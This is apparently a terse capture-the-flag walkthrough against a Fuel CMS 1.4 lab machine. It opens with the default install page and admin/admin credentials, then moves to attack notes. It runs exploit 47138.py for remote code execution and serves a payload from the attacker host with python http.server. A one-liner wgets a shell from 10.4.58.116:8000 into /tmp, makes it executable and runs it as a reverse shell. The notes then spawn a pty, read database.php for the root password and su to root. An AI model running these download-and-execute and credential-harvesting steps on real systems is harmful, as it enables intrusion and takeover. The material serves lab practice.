Welcome to Fuel CMS
Version 1.4
Getting Started

    1
    Change the Apache .htaccess file

    Change the Apache .htaccess found at the root of FUEL CMS's installation folder to the proper RewriteBase directory. The default is your web server's root directory (e.g "/"), but if you have FUEL CMS installed in a sub folder, you will need to add the path to line 5. If you are using the folder it was zipped up in from GitHub, it would be RewriteBase /FUEL-CMS-master/.

    In some server environments, you may need to add a "?" after index.php in the .htaccess like so: RewriteRule .* index.php?/$0 [L]

    NOTE: This is the only step needed if you want to use FUEL without the CMS.
    2
    Install the database

    Install the FUEL CMS database by first creating the database in MySQL and then importing the fuel/install/fuel_schema.sql file. After creating the database, change the database configuration found in fuel/application/config/database.php to include your hostname (e.g. localhost), username, password and the database to match the new database you created.
    3
    Make folders writable

    Make the following folders writable (666 = rw-rw-rw, 777 = rwxrwxrwx, etc.):
        /var/www/html/fuel/application/cache/
        (folder for holding cache files)
        /var/www/html/fuel/application/cache/dwoo/
        (folder for holding template cache files)
        /var/www/html/fuel/application/cache/dwoo/compiled
        (for writing compiled template files)
        /var/www/html/assets/images
        (for managing image assets in the CMS)
    4
    Make configuration changes
        In the fuel/application/config/config.php, change the $config['encryption_key'] to your own unique key.
        In the fuel/application/config/MY_fuel.php file, change the $config['fuel_mode'] configuration property to AUTO. This must be done only if you want to view pages created in the CMS.
        In the fuel/application/config/config.php file, change the $config['sess_save_path'] configuration property to a writable folder above the web root to save session files OR leave it set to NULL to use the default PHP setting.

That's it!

To access the FUEL admin, go to:
http://10.10.78.171/fuel
User name: admin
Password: admin (you can and should change this password and admin user information after logging in)


run exploit 47138.py 
RCE and enter cmd in double quotes only 



you might let phpbash to be uploaded via exploit or msfvenom payload and get revrse shell. Payloads must be uploaded by attacker machine only
 python3 -m http.server 
 wget http://<ip:port>/phpbash.php

Upon executing the following command through the exploit used above, the reverse shell is downloaded and executed, granting access as the www-data user:

wget 10.4.58.116:8000/shell -O /tmp/shell && chmod +x /tmp/shell && /tmp/shell


python3 -c 'import pty; pty.spawn("/bin/bash")'


/home/www-data/flag.txt

locate database.php

cat /var/www/html/fuel/applictaion/config/database.php

got root passwd mememe

su root and you will get root.txt flag
